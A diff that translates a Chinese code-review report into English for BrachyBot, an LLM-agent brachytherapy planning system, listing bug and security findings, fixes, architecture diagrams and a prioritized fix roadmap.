-| 🟡 Medium | 18 | 内存泄漏(2)、线程安全(2)、URL/单位(2)、Provider 格式(1)、异常吞噬(3)、硬编码(3)、GPU 管理(1)、无回滚(1)、全局变量(1) |
-| 🔵 Low | 12 | 注释不一致(1)、锁缺失(2)、死代码(1)、异常吞噬(1)、Provider 缺失(1)、非原子写(1)、Token 估算(1)、Three.js(1)、DRY 违反(1)、PII 日志(1)、依赖版本(1) |
-| **总计** | **52** | |
+| 🔴 Critical | 6 | Gemini discards tool calls, MCTS UCB1 broken, dose contour units, thread race, RL crash, XSS residual |
+| 🟠 High | 16 | memory leaks (3), thread safety (2), sandbox bypass (2), gradient discontinuity (1), FactChecker ineffective (1), OAR hardcoding (1), deployment missing (1), session isolation (1), SSE leak (1), empty mask (1), planning fallback (1) |
+| 🟡 Medium | 18 | memory leaks (2), thread safety (2), URL/units (2), Provider format (1), exception swallowing (3), hardcoding (3), GPU management (1), no rollback (1), global variables (1) |
+| 🔵 Low | 12 | comment mismatch (1), missing locks (2), dead code (1), exception swallowing (1), Provider missing (1), non-atomic write (1), token estimation (1), Three.js (1), DRY violation (1), PII logging (1), dependency versions (1) |
+| **Total** | **52** | |
 
 ---
 
-### 三轮累计统计
+### Three-Round Cumulative Statistics
 
-| 轮次 | Critical | High | Medium | Low | 总计 |
+| Round | Critical | High | Medium | Low | Total |
 |------|----------|------|--------|-----|------|
-| 第一轮 | 12 | 18 | 24 | 15 | 69 |
-| 第二轮 | 8 | 14 | 14 | 2 | 38 |
-| 第三轮 | 6 | 16 | 18 | 12 | 52 |
-| **累计** | **26** | **48** | **56** | **29** | **159** |
-| 已修复 | 12+8 | 4 | 2 | 0 | **26** |
-| 待修复 | 14 | 44 | 54 | 29 | **133** |
+| Round 1 | 12 | 18 | 24 | 15 | 69 |
+| Round 2 | 8 | 14 | 14 | 2 | 38 |
+| Round 3 | 6 | 16 | 18 | 12 | 52 |
+| **Cumulative** | **26** | **48** | **56** | **29** | **159** |
+| Fixed | 12+8 | 4 | 2 | 0 | **26** |
+| To be fixed | 14 | 44 | 54 | 29 | **133** |
 
 ---
 
-### 第三轮修复记录 (2026-06-27 同日修复)
+### Third-Round Fix Record (fixed the same day, 2026-06-27)
 
-> 逐一核实并修复 8 个问题。每个修复前验证真实性，修复后单元测试。
+> Verified and fixed 8 issues one by one. Each fix was verified for authenticity before and unit-tested after.
 
-| # | 问题 | 文件 | 修复内容 | 验证 |
+| # | Issue | File | Fix Content | Verification |
 |---|------|------|----------|------|
-| T3-01 | Gemini 丢弃 tool calls | brain/providers/gemini_llm.py | 从 `response.candidates[0].content.parts` 提取 `function_call`，生成标准 `{id, name, arguments}` 格式 | ✅ mock 测试通过 |
-| T3-02 | MCTS UCB1 parent_visits=1 | brain/core/tree_search_planner.py | 新增 `ucb_score_with_parent(parent_visits)` 方法，`_select()` 使用实际父节点访问次数 | ✅ 探索奖励 5.7x 更精确 |
-| T3-03 | 剂量等高线单位不匹配 | web/server.py | 等高线查找使用归一化单位（与 `dose_distribution_gy` 一致），Gy 值仅用于标签显示 | ✅ 语法验证通过 |
-| T3-05 | _reward_core None 崩溃 | plans/reinforcement.py | 新增 `_dvh_oar_jit_fallback()` 纯 numpy 实现，调用点自动检测 `_reward_core is None` 并使用回退 | ✅ 4 个单元测试通过 |
-| T3-14 | planning_pipeline [0,1,0] 回退 | tool_factory/seed_plan/planning_pipeline.py:988 | 自动恢复路径改用 `_resolve_ref_direc()` 器官感知方向解析 | ✅ 语法验证通过 |
-| T3-18 | FactChecker `decision` 永远 pass | agents/fact_checker.py | **经主 Agent 独立验证：不是 bug，是设计意图。** `format_as_source_summary()` 只读 `concerns`，不读 `decision`；quality gate 是 APPEND-ONLY 模式（reject→conditional+passed=True）。`decision` 字段在 FactChecker 主路径上无消费者。仍做了 cosmetic 改进（score-based decision），加了注释说明原因。 | ✅ 保留改进，降级为 cosmetic |
-| T3-32 | D90 显示单位错误 | tool_factory/report_generator/__init__.py | D90/D100 改为 Gy 单位显示，OAR 违规改为 Gy，目标改为处方剂量 | ✅ 输出验证 "145.5 Gy \| ≥120 Gy" |
-| T3-34 | InteractionMemory.clear() NameError | memory/interaction_memory.py | 添加 `import logging` + `logger = logging.getLogger(__name__)` | ✅ clear() 调用成功 |
+| T3-01 | Gemini discards tool calls | brain/providers/gemini_llm.py | Extract `function_call` from `response.candidates[0].content.parts` and produce the standard `{id, name, arguments}` format | ✅ mock tests pass |
+| T3-02 | MCTS UCB1 parent_visits=1 | brain/core/tree_search_planner.py | Added the `ucb_score_with_parent(parent_visits)` method; `_select()` uses the actual parent visit count | ✅ exploration bonus 5.7x more precise |
+| T3-03 | Dose contour unit mismatch | web/server.py | Contour lookup uses normalized units (consistent with `dose_distribution_gy`); Gy values are only used for label display | ✅ syntax validation passes |
+| T3-05 | _reward_core None crash | plans/reinforcement.py | Added a pure-numpy `_dvh_oar_jit_fallback()`; call sites automatically detect `_reward_core is None` and use the fallback | ✅ 4 unit tests pass |
+| T3-14 | planning_pipeline [0,1,0] fallback | tool_factory/seed_plan/planning_pipeline.py:988 | The automatic recovery path now uses organ-aware direction resolution via `_resolve_ref_direc()` | ✅ syntax validation passes |
+| T3-18 | FactChecker `decision` always pass | agents/fact_checker.py | **Independently verified by the main Agent: not a bug, it is the intended design.** `format_as_source_summary()` only reads `concerns`, not `decision`; the quality gate is in APPEND-ONLY mode (reject→conditional+passed=True). The `decision` field has no consumer on the FactChecker main path. A cosmetic improvement (score-based decision) was still made, with a comment explaining why. | ✅ improvement retained, downgraded to cosmetic |
+| T3-32 | D90 display unit wrong | tool_factory/report_generator/__init__.py | D90/D100 changed to display in Gy units, OAR violations changed to Gy, target changed to prescription dose | ✅ output verified "145.5 Gy \| ≥120 Gy" |
+| T3-34 | InteractionMemory.clear() NameError | memory/interaction_memory.py | Added `import logging` + `logger = logging.getLogger(__name__)` | ✅ clear() call succeeds |
 
 ---
 
-### 第三轮核实更正
+### Third-Round Verification Corrections
 
-| # | 原报告问题 | 核实结果 | 动作 |
+| # | Original Report Issue | Verification Result | Action |
 |---|-----------|----------|------|
-| T3-04 | _pending_callback_events 线程不安全 | ✅ 确认真问题，但修改涉及 AgenticSys.py 核心多线程逻辑，风险高 | ⏭️ 暂不修复，需完整并发测试环境验证 |
-| T3-06 | 7 处 innerHTML 未消毒 | ✅ 确认真问题，但涉及前端 ~20000 行 HTML 多处改动，需回归测试 | ⏭️ 暂不修复，需 Playwright 端到端验证 |
+| T3-04 | _pending_callback_events not thread-safe | ✅ Confirmed real issue, but the fix involves core multi-threaded logic in AgenticSys.py and is high-risk | ⏭️ Not fixed for now; needs a full concurrency test environment |
+| T3-06 | 7 innerHTML usages unsanitized | ✅ Confirmed real issue, but it involves multiple changes across ~20000 lines of frontend HTML and needs regression testing | ⏭️ Not fixed for now; needs Playwright end-to-end verification |
 
 ---
 
-## 全局架构理解 (2026-06-27)
+## Global Architecture Understanding (2026-06-27)
 
-### 系统拓扑
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         BrachyBot 系统                              │
-├─────────────────────────────────────────────────────────────────────┤
-│                                                                     │
-│  ┌──────────┐    HTTP/SSE    ┌────────────────┐                     │
-│  │ Browser   │◄─────────────►│ web/server.py   │  Flask + threaded  │
-│  │ index.html│               │ (3675 行)       │                     │
-│  │ ~20000 行  │               └───────┬────────┘                     │
-│  └──────────┘                        │                              │
-│                               ┌──────▼──────┐                       │
-│                               │ AgenticSys   │  单体核心              │
-│                               │ (6849 行)    │  BrachyAgent          │
-│                               └──┬──┬──┬────┘                       │
-│                    ┌─────────────┘  │  └─────────────┐              │
-│              ┌─────▼─────┐  ┌──────▼──────┐  ┌──────▼──────┐       │
-│              │ brain/     │  │ tool_factory │  │ memory/     │       │
-│              │ LLM 路由   │  │ 30+ 工具     │  │ 5 层记忆    │       │
-│              │ 16 Provider│  │ 100+ 文件    │  │ ~3000 行    │       │
-│              │ ~8000 行   │  │ ~15000 行    │  │             │       │
-│              └───────────┘  └──────┬───────┘  └─────────────┘       │
-│                                    │                                │
-│              ┌─────────────────────┼───────────────────┐           │
-│         ┌────▼─────┐    ┌─────────▼──────┐  ┌─────────▼─────┐     │
-│         │ plans/    │    │ CTV_seg/       │  │ OAR_seg/      │     │
-│         │ 规划算法   │    │ 肿瘤分割       │  │ 器官分割      │     │
-│         │ ~4000 行  │    │ nnU-Net/VoCo   │  │ TotalSeg      │     │
-│         └──────────┘    └────────────────┘  └───────────────┘     │
-│                                                                     │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐             │
-│  │ config/      │  │ agents/      │  │ skills/      │             │
-│  │ prompts/     │  │ 6 Agent      │  │ 技能系统     │             │
-│  │ 模块化 prompt│  │ ~2000 行     │  │ ~2000 行     │             │
-│  └──────────────┘  └──────────────┘  └──────────────┘             │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
-### 数据流 (CT → 治疗计划)
+### System Topology
 
 ```
-DICOM/NIfTI 上传
+┌───────────────────────────────────────────────────────────────────────┐
+│                          BrachyBot System                             │
+├───────────────────────────────────────────────────────────────────────┤
+│                                                                       │
+│  ┌────────────┐   HTTP/SSE   ┌───────────────────┐                    │
+│  │ Browser    │◄────────────►│ web/server.py     │  Flask + threaded  │
+│  │ index.html │              │ (3675 lines)      │                    │
+│  │ ~20000 ln  │              └─────────┬─────────┘                    │
+│  └────────────┘                        │                              │
+│                            ┌───────────▼─────────┐                    │
+│                            │ AgenticSys          │  monolith core     │
+│                            │ (6849 lines)        │  BrachyAgent       │
+│                            └──┬───┬───┬──────────┘                    │
+│                   ┌───────────┘   │   └───────────┐                   │
+│             ┌─────▼─────┐  ┌──────▼───────┐  ┌─────▼───────┐          │
+│             │ brain/    │  │ tool_factory │  │ memory/     │          │
+│             │ LLM route │  │ 30+ tools    │  │ 5-layer mem │          │
+│             │ 16 provid.│  │ 100+ files   │  │ ~3000 lines │          │
+│             │ ~8000 ln  │  │ ~15000 ln    │  │             │          │
+│             └───────────┘  └──────┬───────┘  └─────────────┘          │
+│                                   │                                   │
+│             ┌─────────────────────┼───────────────────┐               │
+│        ┌────▼─────┐    ┌─────────▼──────┐  ┌─────────▼─────┐          │
+│        │ plans/   │    │ CTV_seg/       │  │ OAR_seg/      │          │
+│        │ planning │    │ tumor seg      │  │ organ seg     │          │
+│        │ ~4000 ln │    │ nnU-Net/VoCo   │  │ TotalSeg      │          │
+│        └──────────┘    └────────────────┘  └───────────────┘          │
+│                                                                       │
+│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                 │
+│  │ config/      │  │ agents/      │  │ skills/      │                 │
+│  │ prompts/     │  │ 6 Agents     │  │ skill system │                 │
+│  │ modular prmpt│  │ ~2000 lines  │  │ ~2000 lines  │                 │
+│  └──────────────┘  └──────────────┘  └──────────────┘                 │
+└───────────────────────────────────────────────────────────────────────┘
+```
+
+### Data Flow (CT → Treatment Plan)
+
+```
+DICOM/NIfTI upload
     │
     ▼
-[CT 预处理] ─── 重采样至 1mm³ 各向同性
+[CT preprocessing] ─── resample to 1mm³ isotropic
     │
-    ├──► [CTV 分割] ─── nnU-Net 或 VoCo ─── GPU ~4GB
+    ├──► [CTV segmentation] ─── nnU-Net or VoCo ─── GPU ~4GB
     │        │
     │        ▼
-    ├──► [OAR 分割] ─── TotalSegmentator ─── GPU ~6GB
+    ├──► [OAR segmentation] ─── TotalSegmentator ─── GPU ~6GB
     │        │
     │        ▼
-    ├──► [轨迹初始化] ─── 入口点搜索 + OAR 避障
+    ├──► [trajectory initialization] ─── entry point search + OAR avoidance
     │        │
     │        ▼
-    ├──► [种子优化] ─── RL/DVH 奖励 + 梯度下降
+    ├──► [seed optimization] ─── RL/DVH reward + gradient descent
     │        │
     │        ▼
-    ├──► [剂量计算] ─── myDoseNet CNN ─── GPU ~2GB
+    ├──► [dose calculation] ─── myDoseNet CNN ─── GPU ~2GB
     │        │
     │        ▼
-    └──► [质量评估] ─── DVH + V100/D90 + OAR 约束
+    └──► [quality assessment] ─── DVH + V100/D90 + OAR constraints
              │
              ▼
-         [报告生成] ─── 截图 + 指标 + 临床解读
+         [report generation] ─── screenshots + metrics + clinical interpretation
 ```
 
-### 关键架构特征
+### Key Architectural Characteristics
 
-1. **单体 Python 核心** — AgenticSys.py 6849 行包含 Agent、Memory、Tool Registry、LLM 接口、响应格式化
-2. **LLM 驱动一切** — 所有工具调用由 LLM 决策，无硬编码流水线（除 planning_pipeline 工具内部）
-3. **GPU 密集** — 分割+规划+剂量估算需 ~12GB VRAM 串行执行
-4. **单用户设计** — `_global_agent` 全局变量、无认证、会话隔离不完善
-5. **无部署方案** — 无 Dockerfile、无 CI/CD、无生产配置
+1. **Monolithic Python core** — AgenticSys.py at 6849 lines contains the Agent, Memory, Tool Registry, LLM interface, and response formatting
+2. **LLM drives everything** — all tool calls are decided by the LLM, with no hardcoded pipeline (except inside the planning_pipeline tool)
+3. **GPU-intensive** — segmentation + planning + dose estimation require ~12GB VRAM and run serially
+4. **Single-user design** — `_global_agent` global variable, no authentication, incomplete session isolation
+5. **No deployment solution** — no Dockerfile, no CI/CD, no production configuration
 
-### 最高优先级修复路线图
+### Highest-Priority Fix Roadmap
 
-| 优先级 | 问题 | 修复方案 | 状态 |
+| Priority | Issue | Fix Plan | Status |
 |--------|------|----------|------|
-| **P0** | Gemini 丢 tool calls (T3-01) | 实现 Gemini tool call 解析 | ✅ 已修复 |
-| **P0** | MCTS UCB1 损坏 (T3-02) | 调用 `_get_parent_visits()` 替代硬编码 1 | ✅ 已修复 |
-| **P0** | 剂量等高线单位 (T3-03) | 统一 Gy / 归一化单位转换 | ✅ 已修复 |
-| **P0** | RL _reward_core 崩溃 (T3-05) | 添加 None 保护 + numpy 回退 | ✅ 已修复 |
-| **P0** | planning_pipeline [0,1,0] (T3-14) | 改用 `"auto"` + `_resolve_ref_direc` | ✅ 已修复 |
-| **P1** | XSS 残留 (T3-06) | 7 处 innerHTML 加 `_sanitizeHtml` | ⏭️ 需 Playwright 验证 |
-| **P1** | FactChecker decision 语义 (T3-18) | score-based decision（cosmetic，非 bug） | ✅ cosmetic 改进 |
-| **P1** | 代码执行沙箱 (T3-15) | 包装 `__import__` 限制模块 | 待修复 |
-| **P1** | D90 单位显示 (T3-32) | 改为 Gy 显示 | ✅ 已修复 |
-| **P1** | 空 mask 崩溃 (T3-12) | 添加 np.any() 保护 | 待修复 |
-| **P2** | 会话线程安全 (T3-10) | 添加 threading.Lock | 待修复 |
-| **P2** | AgentMemory 泄漏 (T3-07) | 添加 TTL + 大小限制 | 待修复 |
-| **P2** | InteractionMemory crash (T3-34) | 添加 logger import | ✅ 已修复 |
-| **P2** | 导出 auth (T3-25) | 统一 @require_api_key | 待修复 |
-| **P2** | GPU 内存管理 (T3-38) | 推理后 empty_cache + model cleanup | 待修复 |
-| **P3** | Docker 化 (T3-21) | Dockerfile + docker-compose | 待修复 |
-| **P3** | Provider 统一 (T3-33) | 标准 tool call schema | 待修复 |
+| **P0** | Gemini discards tool calls (T3-01) | Implement Gemini tool call parsing | ✅ Fixed |
+| **P0** | MCTS UCB1 broken (T3-02) | Call `_get_parent_visits()` instead of hardcoded 1 | ✅ Fixed |
+| **P0** | Dose contour units (T3-03) | Unify Gy / normalized unit conversion | ✅ Fixed |
+| **P0** | RL _reward_core crash (T3-05) | Add None protection + numpy fallback | ✅ Fixed |
+| **P0** | planning_pipeline [0,1,0] (T3-14) | Switch to `"auto"` + `_resolve_ref_direc` | ✅ Fixed |
+| **P1** | XSS residual (T3-06) | Add `_sanitizeHtml` to 7 innerHTML usages | ⏭️ Needs Playwright verification |
+| **P1** | FactChecker decision semantics (T3-18) | score-based decision (cosmetic, not a bug) | ✅ cosmetic improvement |
+| **P1** | Code execution sandbox (T3-15) | Wrap `__import__` to restrict modules | To be fixed |
+| **P1** | D90 unit display (T3-32) | Change to Gy display | ✅ Fixed |
+| **P1** | Empty mask crash (T3-12) | Add np.any() protection | To be fixed |
+| **P2** | Session thread safety (T3-10) | Add threading.Lock | To be fixed |
+| **P2** | AgentMemory leak (T3-07) | Add TTL + size limit | To be fixed |
+| **P2** | InteractionMemory crash (T3-34) | Add logger import | ✅ Fixed |
+| **P2** | Export auth (T3-25) | Unify @require_api_key | To be fixed |
+| **P2** | GPU memory management (T3-38) | empty_cache + model cleanup after inference | To be fixed |
+| **P3** | Dockerization (T3-21) | Dockerfile + docker-compose | To be fixed |
+| **P3** | Provider unification (T3-33) | Standard tool call schema | To be fixed |
 
 ---
 
-**第三轮审查完成时间**: 2026-06-27  
-**审查人**: Claude Code (8 并行 Agent + 主 Agent 综合分析)  
-**审查覆盖**: 281 文件 / 5876 符号 / 9930 边  
-**下次审查建议**: 2026-07-27（每月一次）
+**Third-Round Review Completion Time**: 2026-06-27  
+**Reviewer**: Claude Code (8 parallel Agents + main Agent comprehensive analysis)  
+**Review Coverage**: 281 files / 5876 symbols / 9930 edges  
+**Next Review Recommendation**: 2026-07-27 (once a month)
 
 ---
 
-## 第四轮：子 Agent 硬编码问题全面修复 (2026-06-27 同日)
+## Round 4: Comprehensive Fix of Sub-Agent Hardcoding Issues (same day, 2026-06-27)
 
-> 用户指出："都说是 agent 为什么不让 LLM 来决策呢，硬编码会遇到很多意想不到的问题吧"
+> The user pointed out: "If these are all called agents, why not let the LLM make the decisions? Hardcoding will run into many unexpected problems, won't it?"
 
-### 问题发现
+### Problem Discovery
 
-在 LLM-based agent 系统中，关键决策逻辑不应该硬编码。检查发现 3 个子 agent 存在硬编码问题：
+In an LLM-based agent system, key decision logic should not be hardcoded. Inspection found hardcoding issues in 3 sub-agents:
 
-| Agent | 硬编码逻辑 | 问题 |
+| Agent | Hardcoded Logic | Issue |
 |-------|-----------|------|
-| FactChecker | `_prepare_fact_check_brief()` 正则提取 | 无法理解上下文，漏掉重要声明 |
-| RouterAgent | `_quick_route()` 关键词匹配 | 无法理解复杂语义，容易误分类 |
-| CompletenessChecker | `_extract_requirements()` 正则 + 停用词 | 无法覆盖所有表述方式 |
+| FactChecker | `_prepare_fact_check_brief()` regex extraction | Cannot understand context, misses important claims |
+| RouterAgent | `_quick_route()` keyword matching | Cannot understand complex semantics, easily misclassifies |
+| CompletenessChecker | `_extract_requirements()` regex + stopwords | Cannot cover all phrasings |
 
-### 修复方案
+### Fix Plan
 
-**核心原则**: LLM 优先，硬编码作为 fallback
+**Core principle**: LLM first, hardcoding as fallback
 
-#### 1. FactChecker 声明提取 ✅ 已修复
-- **改进**: 优先使用 LLM 理解上下文，提取重要声明
-- **Fallback**: 正则表达式作为兜底
-- **文件**: `AgenticSys.py:3265-3359`
+#### 1. FactChecker claim extraction ✅ Fixed
+- **Improvement**: Prefer the LLM to understand context and extract important claims
+- **Fallback**: Regular expressions as a fallback
+- **File**: `AgenticSys.py:3265-3359`
 
-#### 2. RouterAgent 路由决策 ✅ 已修复
-- **改进**: 优先使用 LLM 理解语义，准确路由
-- **Fallback**: 硬编码关键词匹配作为兜底
-- **文件**: `agents/router_agent.py:125-149`
+#### 2. RouterAgent routing decision ✅ Fixed
+- **Improvement**: Prefer the LLM to understand semantics and route accurately
+- **Fallback**: Hardcoded keyword matching as a fallback
+- **File**: `agents/router_agent.py:125-149`
 
-#### 3. CompletenessChecker 完整性检查 ✅ 已修复
-- **改进**: 优先使用 LLM 语义匹配，检查完整性
-- **Fallback**: 确定性方法作为兜底
-- **文件**: `agents/completeness_checker.py:70-117`
+#### 3. CompletenessChecker completeness check ✅ Fixed
+- **Improvement**: Prefer LLM semantic matching to check completeness
+- **Fallback**: Deterministic methods as a fallback
+- **File**: `agents/completeness_checker.py:70-117`
 
-### 保留的合理硬编码
+### Retained Reasonable Hardcoding
 
-| Agent | 硬编码逻辑 | 保留原因 |
+| Agent | Hardcoded Logic | Reason for Retention |
 |-------|-----------|----------|
-| PlanReviewer | `_DEFAULT_OAR_MULTIPLIERS` | 默认值可从 config 覆盖，客观数值比较 |
-| SafetyGuardian | 确定性安全检查 | 安全检查需要确定性，不应由 LLM 做可能出错的判断 |
+| PlanReviewer | `_DEFAULT_OAR_MULTIPLIERS` | Defaults can be overridden from config; objective numeric comparison |
+| SafetyGuardian | Deterministic safety checks | Safety checks require determinism and should not be left to a fallible LLM judgment |
 
-### 预期效果
+### Expected Effect
 
-| Agent | 改进前 | 改进后 |
+| Agent | Before Improvement | After Improvement |
 |-------|--------|--------|
-| FactChecker | 漏掉微妙声明 | ✅ 理解上下文，提取真正重要的 |
-| RouterAgent | 误分类复杂请求 | ✅ 理解语义，准确路由 |
-| CompletenessChecker | 无法识别同义词 | ✅ 理解改述，准确检查 |
+| FactChecker | Misses subtle claims | ✅ Understands context, extracts what truly matters |
+| RouterAgent | Misclassifies complex requests | ✅ Understands semantics, routes accurately |
+| CompletenessChecker | Cannot recognize synonyms | ✅ Understands paraphrasing, checks accurately |
 
-### 风险与缓解
+### Risks and Mitigation
 
-- **低风险**: 所有改进都有 fallback 机制，LLM 失败时自动回退
-- **性能影响**: 增加 LLM 调用次数，可能增加延迟
-- **Token 消耗**: 每次调用消耗 token，建议优化 prompt
+- **Low risk**: All improvements have a fallback mechanism; if the LLM fails, it automatically falls back
+- **Performance impact**: Increases the number of LLM calls, possibly increasing latency
+- **Token consumption**: Each call consumes tokens; optimizing the prompt is recommended
 
-### 详细报告
+### Detailed Report
 
 → `docs/HARDCODE_ISSUES_FIX_2026-06-27.md`
 
 ---
 
-## 第五轮：独立深度审查 (2026-06-28)
+## Round 5: Independent Deep Review (2026-06-28)
 
-> MiMo Code Agent 独立审查 BrachyBot 代码库，验证已有问题并发现新问题。
+> MiMo Code Agent independently reviewed the BrachyBot codebase, verifying existing issues and discovering new ones.
 
-### 审查方法
+### Review Method
 
-直接阅读核心文件（brachybot.py、AgenticSys.py、web/server.py、agents/、brain/、memory/、tool_factory/、config/），验证已有报告中的问题，并寻找新增问题。
+Directly read the core files (brachybot.py, AgenticSys.py, web/server.py, agents/, brain/, memory/, tool_factory/, config/) to verify issues in existing reports and look for new ones.
 
-### 核实已有问题
+### Verification of Existing Issues
 
-| # | 原报告编号 | 核实结果 | 备注 |
+| # | Original Report ID | Verification Result | Notes |
 |---|-----------|----------|------|
-| V-01 | H-01 | ✅ 确认 — AgenticSys.py 7243 行，BrachyAgent 类承担工具加载、LLM 调用、记忆管理、工作流编排、CTV/OAR 合并、UI 状态管理等 6+ 职责 | God Class 问题 |
-| V-02 | T3-21 | ✅ 确认 — 无 Dockerfile、无 docker-compose.yml、无 pyproject.toml、无 setup.py | 缺少部署和包管理 |
-| V-03 | H-16 | ✅ 确认 — 仅 4 个测试文件（conftest.py + 3 个 test_*.py），核心模块零覆盖 | 测试严重不足 |
-| V-04 | C-02/C-03 | ✅ 确认 — shell_executor 黑名单方式 + code_executor ALLOWED_MODULES 含 os | 安全风险 |
-| V-05 | T3-22 | ✅ 确认 — `AgenticSys.py:1301` 设置 `_self_module._global_agent = self`，多用户并发时共享状态 | 会话隔离缺陷 |
-| V-06 | H-06 | ✅ 确认 — 大量 `except Exception as e: pass` 或仅 log warning | 异常处理过宽 |
-| V-07 | T3-52 | ✅ 确认 — requirements.txt 全用 `>=`，无版本上限 | 依赖锁定缺失 |
-| V-08 | H-15 | ✅ 确认 — 大量方法返回 `Any` 或 `Dict`，缺少泛型标注 | 类型提示缺失 |
+| V-01 | H-01 | ✅ Confirmed — AgenticSys.py is 7243 lines; the BrachyAgent class bears 6+ responsibilities: tool loading, LLM calls, memory management, workflow orchestration, CTV/OAR merging, UI state management | God Class problem |
+| V-02 | T3-21 | ✅ Confirmed — no Dockerfile, no docker-compose.yml, no pyproject.toml, no setup.py | Missing deployment and package management |
+| V-03 | H-16 | ✅ Confirmed — only 4 test files (conftest.py + 3 test_*.py), zero coverage of core modules | Severely insufficient testing |
+| V-04 | C-02/C-03 | ✅ Confirmed — shell_executor uses a blacklist approach + code_executor ALLOWED_MODULES contains os | Security risk |
+| V-05 | T3-22 | ✅ Confirmed — `AgenticSys.py:1301` sets `_self_module._global_agent = self`, sharing state under concurrent multi-user access | Session isolation defect |
+| V-06 | H-06 | ✅ Confirmed — many `except Exception as e: pass` or log-warning-only handlers | Exception handling too broad |
+| V-07 | T3-52 | ✅ Confirmed — requirements.txt uses `>=` throughout with no upper bounds | Missing dependency locking |
+| V-08 | H-15 | ✅ Confirmed — many methods return `Any` or `Dict`, lacking generic annotations | Missing type hints |
 
-### 新发现问题
+### Newly Discovered Issues
 
-#### 🔴 Critical — 新发现
+#### 🔴 Critical — New Findings
 
-| # | 文件 | 问题 |
+| # | File | Issue |
 |---|------|------|
-| V-09 | 全局（53 处） | **sys.path.insert 滥用** — 53 个文件使用 `sys.path.insert(0, ...)` 进行导入，包括 brachybot.py、web/server.py、tests/conftest.py、tool_factory/ 下 20+ 文件、agents/、skills/、brain/ 等。这说明项目缺少 `pyproject.toml` 或 `setup.py` 声明包结构，导致无法通过 pip install -e . 正确安装，且模块间导入顺序依赖运行时路径操作。 |
-| V-10 | tool_factory/tool_creator/__init__.py:144,226 | **运行时动态 sys.path 修改** — `tool_creator` 工具在执行过程中动态向 sys.path 插入路径，如果多个 agent 实例并发运行，会互相污染 sys.path。 |
+| V-09 | global (53 places) | **sys.path.insert abuse** — 53 files use `sys.path.insert(0, ...)` for imports, including brachybot.py, web/server.py, tests/conftest.py, 20+ files under tool_factory/, agents/, skills/, brain/, etc. This shows the project lacks a `pyproject.toml` or `setup.py` declaring the package structure, so it cannot be installed correctly via pip install -e ., and import order between modules depends on runtime path manipulation. |
+| V-10 | tool_factory/tool_creator/__init__.py:144,226 | **Runtime dynamic sys.path modification** — the `tool_creator` tool dynamically inserts paths into sys.path during execution; if multiple agent instances run concurrently, they pollute each other's sys.path. |
 
-#### 🟠 High — 新发现
+#### 🟠 High — New Findings
 
-| # | 文件 | 问题 |
+| # | File | Issue |
 |---|------|------|
-| V-11 | 全局 | **无 pyproject.toml / setup.py** — 项目无法通过标准 Python 打包工具安装。没有声明入口点（console_scripts）、依赖组、构建后端。这使得 CI/CD、Docker 构建、开发环境搭建都依赖手动 sys.path 操作。 |
-| V-12 | web/server.py:34-38 | **API Key 认证可选且默认禁用** — 不设置 `BRACHYBOT_API_KEY` 环境变量时完全禁用认证。对于处理 PHI（受保护健康信息）的医疗系统，这是合规风险。 |
-| V-13 | web/server.py:221 | **500MB 上传限制过大** — `MAX_CONTENT_LENGTH = 500 * 1024 * 1024`，对于 CT 图像（通常 <100MB）来说过于宽松，可被用于 DoS 攻击。 |
-| V-14 | AgenticSys.py:1300-1301 | **全局 agent 引用** — `_self_module._global_agent = self` 使得 planning_pipeline 等工具通过全局变量获取 agent 实例。多个 session 的 agent 会互相覆盖，最后一个初始化的 agent 成为全局 agent。 |
-| V-15 | AgenticSys.py:5937 | **LLM 响应成功判断过于简单** — `success="error" not in response.lower() and "fail" not in response.lower()`，如果 LLM 回复"no error occurred"也会被误判为成功。 |
+| V-11 | global | **No pyproject.toml / setup.py** — the project cannot be installed with standard Python packaging tools. No entry points (console_scripts), dependency groups, or build backend are declared. This makes CI/CD, Docker builds, and development environment setup all depend on manual sys.path manipulation. |
+| V-12 | web/server.py:34-38 | **API Key authentication optional and disabled by default** — authentication is fully disabled when the `BRACHYBOT_API_KEY` environment variable is not set. For a medical system handling PHI (protected health information), this is a compliance risk. |
+| V-13 | web/server.py:221 | **500MB upload limit too large** — `MAX_CONTENT_LENGTH = 500 * 1024 * 1024` is too permissive for CT images (usually <100MB) and can be used for DoS attacks. |
+| V-14 | AgenticSys.py:1300-1301 | **Global agent reference** — `_self_module._global_agent = self` lets tools such as planning_pipeline obtain the agent instance through a global variable. Agents from multiple sessions overwrite each other, and the last initialized agent becomes the global agent. |
+| V-15 | AgenticSys.py:5937 | **LLM response success check too simplistic** — `success="error" not in response.lower() and "fail" not in response.lower()`; if the LLM replies "no error occurred" it is also misjudged as success. |
 
-#### 🟡 Medium — 新发现
+#### 🟡 Medium — New Findings
 
-| # | 文件 | 问题 |
+| # | File | Issue |
 |---|------|------|
-| V-16 | config/prompts/ | **Prompt 无版本控制** — 13 个 prompt 模板文件无版本号、无变更日志，修改后无法追踪历史。 |
-| V-17 | web/server.py:45-93 | **TaskManager 无 TTL 清理** — 已在 T3-23 中报告，但确认：任务永不清理，长时间运行的服务器会 OOM。 |
-| V-18 | AgenticSys.py:474 | **compact() 只保留 6 条消息** — 对于需要多步骤操作的临床工作流（CTV→OAR→Planning→Eval），6 条消息不够保留完整上下文。 |
-| V-19 | memory/ | **记忆系统无持久化加密** — experience_memory.py、layered_memory.py 将患者数据以明文 JSON 写入 memory/data/，违反 HIPAA/个人信息保护法要求。 |
-| V-20 | tool_factory/code_executor/__init__.py:23-28 | **ALLOWED_MODULES 含 os** — `os` 模块允许文件系统操作和进程管理，与"沙箱"设计矛盾。 |
+| V-16 | config/prompts/ | **Prompts have no version control** — the 13 prompt template files have no version numbers or changelogs, so history cannot be tracked after modification. |
+| V-17 | web/server.py:45-93 | **TaskManager has no TTL cleanup** — already reported in T3-23, but confirmed: tasks are never cleaned up and a long-running server will OOM. |
+| V-18 | AgenticSys.py:474 | **compact() keeps only 6 messages** — for clinical workflows requiring multi-step operations (CTV→OAR→Planning→Eval), 6 messages are not enough to preserve full context. |
+| V-19 | memory/ | **Memory system has no encryption at rest** — experience_memory.py and layered_memory.py write patient data as plaintext JSON into memory/data/, violating HIPAA/personal information protection law requirements. |
+| V-20 | tool_factory/code_executor/__init__.py:23-28 | **ALLOWED_MODULES contains os** — the `os` module allows file system operations and process management, contradicting the "sandbox" design. |
 
-#### 🔵 Low — 新发现
+#### 🔵 Low — New Findings
 
-| # | 文件 | 问题 |
+| # | File | Issue |
 |---|------|------|
